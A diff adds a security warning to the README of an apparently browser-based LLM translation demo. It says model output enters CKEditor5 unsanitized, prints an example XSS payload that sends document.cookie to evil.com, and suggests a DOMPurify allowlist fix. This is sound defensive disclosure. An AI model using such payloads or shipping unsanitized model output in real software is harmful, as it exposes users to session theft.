@@ -110,6 +110,38 @@ LocalTranslator/
 - GPU memory affects max model size
 - Chrome/Edge has better WebGPU support
 
+## Security Warning
+
+### XSS Vulnerability
+
+This demo has a **reflected XSS vulnerability** in the translation pipeline. The LLM's output is inserted directly into CKEditor5 without HTML sanitization.
+
+**Risk:** An attacker who can influence the translation model's output could inject malicious HTML/JavaScript:
+- `<script>` tags
+- Event handlers (`onclick`, `onerror`, etc.)
+- `javascript:` URLs in attributes
+- Data exfiltration via injected scripts
+
+**Example attack vector:**
+```
+User translates text → LLM returns: <img src="x" onerror="fetch('evil.com?cookie='+document.cookie)">
+```
+
+**Mitigation for production:**
+1. Add DOMPurify sanitization before inserting HTML:
+   ```javascript
+   import DOMPurify from 'dompurify';
+   const sanitized = DOMPurify.sanitize(llmOutput, {
+     ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a', 'span'],
+     ALLOWED_ATTR: ['href', 'title'],
+     ALLOW_DATA_ATTR: false
+   });
+   ```
+
+2. Or configure CKEditor5's HTML Support plugin with strict allowlist
+
+**This demo intentionally lacks sanitization for demonstration purposes. Do not use with untrusted content in production environments.**
+
 ## Development
 
 ### Adding Custom Models
